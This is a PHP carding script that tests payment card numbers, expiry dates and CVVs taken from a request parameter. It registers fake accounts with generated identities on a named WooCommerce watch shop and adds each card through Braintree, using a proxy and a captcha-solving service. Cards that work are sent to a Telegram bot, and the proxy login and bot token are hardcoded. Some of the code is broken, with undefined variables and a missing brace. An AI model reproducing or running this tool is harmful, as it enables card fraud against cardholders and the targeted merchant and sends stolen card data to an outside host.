<?php
    error_reporting(0);
    $time_start = microtime(true);
    set_time_limit(200);
    // include("firstDataMessage.php");
    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


    function RandomString($length = 16)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    
   function cURLc($url, $headers, $postfields, $customrequest) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            // CURLOPT_SSL_VERIFYPEER => 1, 
            // CURLOPT_SSL_VERIFYHOST => 1, 
            // CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
    function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_SSL_VERIFYPEER => 0, 
            // CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
   
     function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
            CURLOPT_PROXY => "isp2.hydraproxy.com:9989", 
            CURLOPT_PROXYUSERPWD => "rodm26298vzpo63485:SILNes0gboZ7gsle",
            CURLOPT_HEADER => 1,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    extract($_GET);
    $separator = explode("|", $lista);
//    $amnt = 1;
    $cc = $separator[0];
    $ccbin = substr($cc, 0,6);
    $mm = $separator[1];
    $yy = $separator[2];
    $yy1 = substr($yy, 2,2);
    $cvv = $separator[3];
    $cookie = RandomString();
    $cbin = substr($cc, 0,1);
//    $rnum = rand(1111,9999);
    $str = substr(randomString(), 0,7);

    if($cbin == 5){ 
    $cbin = 'masterCard'; 
    } 
    else if($cbin == 4){ 
    $cbin = 'visa'; 
    } 

function solveCaptcha($site,$siteKey,$clientKey){
$createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
               "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websitUSDL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
 $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
 $status = "processing";
 $gResponse = "";
  while ($status == "processing") {
    sleep(3);
    $getTaskResult =  cURLc(
        "https://api.capmonster.cloud/getTaskResult ",
        $headers = [
                "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
        "POST"
    );
 $status = getstr($getTaskResult,'"status":"','"');
 $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
return $getTaskResult ;
}
     // $port = rand(10000, 11000);
 function get_bankinfo($ccbins){
    $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://binov.net/",
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_HEADER => 1,
            CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://binov.net/",
           'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32'
            ],
            CURLOPT_POSTFIELDS => "BIN=$ccbins"
        ));
        $g_ccdets = curl_exec($ch);
        $cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
        $cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
        $cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
        $cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
        $cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
        // return array($cc_type0 => $cc_type0, $cc_bname => $cc_bname, $cc_type1 => $cc_type1, $cc_type2 => $cc_type2, $cc_country => $cc_country);
         $CC_fDets = "Bank: $cc_bname Country: $cc_country";
         return  $CC_fDets;
}

$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');
$cookie = randomString();
$str = substr(randomString(),0,7);
$ips = "175.176.92.54";
$retries = 0;
$transaction_complete = false;

// 	# code...

$PAGE = cURL(
    'https://windycitywatchcollector.com/my-account/',
    $headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    ],
    "", "GET", 1, $cookie);
$login_nonce = GetStr($PAGE, 'name="woocommerce-login-nonce" value="', '"');
$register_nonce = GetStr($PAGE, 'name="woocommerce-register-nonce" value="', '"');

$add_payment = cURL(
    "https://windycitywatchcollector.com/my-account/",
    $headers = [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Content-Type: application/x-www-form-urlencoded",
        "referer: https://windycitywatchcollector.com/my-account/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
    ],
    //    "username=$str%40gmail.com&password=asdasd123123%40&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fmy-account%2F&login=Log+in",
    "email=$str%40gmail.com&password=asdasd123123%40&woocommerce-register-nonce=$register_nonce&_wp_http_referer=%2Fmy-account%2F&register=Register",
    "POST",
    1,
    $cookie
);
$edit_address = cURL(
    'https://windycitywatchcollector.com/my-account/edit-address/billing/',
    $headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "referer: https://windycitywatchcollector.com/my-account/edit-address/billing/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    ],
    "",
    "GET",
    1,
    $cookie
);
$save_address = GetStr($edit_address, 'name="woocommerce-edit-address-nonce" value="', '"');

$confirm_address = cURL(
    'https://windycitywatchcollector.com/my-account/edit-address/billing/',
    $headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://windycitywatchcollector.com/my-account/edit-address/billing/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    ],
    "billing_first_name=$fname&billing_last_name=$lname&billing_company=DOCS&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city
                &billing_state=$state&billing_postcode=$postcode&billing_phone=%2B442125123412&billing_email=$str%40aol.com&save_address=Save+address&woocommerce-edit-address-nonce=$save_address&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address",
    "POST",
    1,
    $cookie
);

$prepare_pm = cURL_ProxyOn(
    'https://windycitywatchcollector.com/my-account/add-payment-method/',
    $headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "referer: https://windycitywatchcollector.com/my-account/edit-address/billing/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    ],
    "", "GET", 1, $cookie
);
 $add_pm_nonce = GetStr($prepare_pm, 'name="woocommerce-add-payment-method-nonce" value="', '"');
  $data = json_decode(base64_decode(GetStr($prepare_pm, 'wc_braintree_client_token = ["', '"')),true);
$fprint = $data['authorizationFingerprint'];
//$acc_token = $data['access_token'];

$graphql = cURL_ProxyOn(
    "https://payments.braintree-api.com/graphql",
    $headers = [
        "Accept: */*",
        "Authorization: Bearer $fprint",
        "Braintree-Version: 2018-05-10",
        "Content-Type: application/json",
        "Origin: https://assets.braintreegateway.com",
        "Referer: https://assets.braintreegateway.com/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
    ],
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"90012","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    "POST",
    1,
    $cookie
);
$token = GetStr($graphql, '"token":"', '"');

 $confirm_method = cURL_ProxyOn(
    'https://windycitywatchcollector.com/my-account/add-payment-method/',
    $headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://windycitywatchcollector.com/my-account/add-payment-method/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    ],
    "payment_method=braintree_cc&braintree_cc_nonce_key=$token&braintree_cc_device_data=%7B%22device_session_id%22%3A%22edee26835ee45d4559d77d4332328ac6%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22f967bcbb59aa62ce1ae13b25f7622683%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=&woocommerce-add-payment-method-nonce=$add_pm_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
    "POST",
    1,
    $cookie
);
echo $e = urlencode($confirm_method);
  if(strpos($ajax_confirm, 'Nice!')) {
       $cc_info = get_bankinfo($ccbins);
        echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
        file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=@payamanss&text='.$lista.' CHARGED CCN - STRPE GATE');

    }elseif(strpos($ajax_confirm, 'Status code') || strpos($token_method, '"error":')) {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.urldecode($response).' - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }else {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
//    }

   

   

    unlink("cookies/$cookie.txt");

?>  